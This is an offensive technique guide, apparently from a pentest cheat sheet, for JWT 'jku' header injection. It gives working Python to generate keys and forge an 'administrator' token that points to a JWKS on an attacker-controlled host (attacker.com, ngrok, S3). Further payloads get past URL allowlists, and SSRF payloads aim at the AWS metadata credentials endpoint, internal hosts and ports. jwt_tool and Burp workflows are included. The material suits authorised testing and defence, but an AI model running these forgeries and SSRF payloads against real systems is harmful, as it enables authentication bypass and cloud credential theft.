# JWT — JKU Injection (`jku` header → external JWKS)

## When this applies

- The verifier dereferences the `jku` (JWK Set URL) header parameter to fetch verification keys.
- No URL validation, or only weak prefix/suffix checks, allowing an attacker-controlled URL.
- Pivots into SSRF when the `jku` URL hits internal services.

## Technique

Host a JWKS file containing your own public key on an attacker-controlled server. Set `jku` in the token header to your URL. Sign with your private key. The vulnerable server fetches the JWKS, finds the matching `kid`, verifies the signature against your public key, accepts the token.

## Steps

### 1. Generate key pair and JWKS file

```python
from jwcrypto import jwk
import json

key = jwk.JWK.generate(kty='RSA', size=2048, kid='attack-key', use='sig')
public = json.loads(key.export_public())

jwks = {"keys": [public]}
with open('jwks.json', 'w') as f:
    json.dump(jwks, f)
```

### 2. Host JWKS

**Local HTTP:**
```bash
python3 -m http.server 8080
# Serves jwks.json at http://localhost:8080/jwks.json
```

**Public via ngrok:**
```bash
python3 -m http.server 8080 &
ngrok http 8080
# Use the ngrok URL: https://<random>.ngrok.io/jwks.json
```

**Public via S3 / Cloud storage:**
```bash
aws s3 cp jwks.json s3://my-bucket/jwks.json --acl public-read
# URL: https://my-bucket.s3.amazonaws.com/jwks.json
```

### 3. Forge token with `jku`

```python
import jwt

header = {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "attack-key",
    "jku": "https://attacker.com/jwks.json"
}
payload = {"sub": "administrator", "exp": 9999999999}
token = jwt.encode(payload, key.export_to_pem(private_key=True, password=None),
                   algorithm='RS256', headers=header)
```

### 4. Submit token

```bash
curl -H "Authorization: Bearer $TOKEN" https://api.example.com/admin
```

### 5. Bypass URL validation

When the verifier checks `jku` against an allowlist:

**Userinfo trick (URL parser confusion):**
```json
{"jku": "https://trusted.com@attacker.com/jwks.json"}
```
Browser-style parsers interpret `trusted.com` as username and `attacker.com` as host.

**Subdomain confusion:**
```json
{"jku": "https://trusted.com.attacker.com/jwks.json"}
{"jku": "https://attacker.com/trusted.com/jwks.json"}
```

**Open redirect chain:**
If `trusted.com/redirect?to=` exists:
```json
{"jku": "https://trusted.com/redirect?to=https://attacker.com/jwks.json"}
```

**Path traversal:**
```json
{"jku": "https://trusted.com/oauth/../../attacker.com/jwks.json"}
```

### 6. SSRF via `jku`

If `jku` allows arbitrary URLs but you don't need to forge a valid token:

**Cloud metadata (AWS):**
```json
{"jku": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

**Internal localhost services:**
```json
{"jku": "http://localhost:8080/admin/jwks.json"}
{"jku": "http://192.168.1.1:8080/jwks.json"}
```

**Internal port scan via response timing:**
```json
{"jku": "http://internal-host:22/"}    // open port = error timing diff
```

The verifier often surfaces the response in error logs / debug output, leaking the SSRF response.

### 7. jwt_tool automation

```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/jwks.json -pc sub -pv admin
```

`-X s` runs the JKU-spoofing attack with your hosted JWKS.

### 8. Burp JWT Editor workflow

1. Generate RSA key in JWT Editor.
2. Export public JWK; embed in `jwks.json` and host.
3. Repeater → JWT tab → Attack → Sign with JWK Set URL → enter your URL.
4. Send.

## Verifying success

- HTTP server logs show the target server fetching `/jwks.json` shortly after you submit the token.
- API returns 200 with the modified claims honored.
- For SSRF: response body or timing reveals internal host details.

## Common pitfalls

- Modern libraries enforce strict `jku` allowlists by default; only legacy or misconfigured verifiers fetch arbitrary URLs.
- The verifier may use a TLS truststore that doesn't trust your hosting provider's cert — switch to plain HTTP if allowed, or use a Let's Encrypt cert.
- `kid` in your token must match the `kid` in your JWKS, or the verifier won't find a key match.
- Some servers cache JWKS responses for hours — change `kid` between tests to force re-fetch.
- SSRF via `jku` is read-only (HTTP GET only) — can't POST, can't change methods. Useful for metadata theft, not write actions.

## Tools

- jwt_tool (`-X s`).
- Burp JWT Editor (Sign with JWK Set URL).
- ngrok / Burp Collaborator for public hosting + visibility.
- HTTP server logs to confirm the fetch.
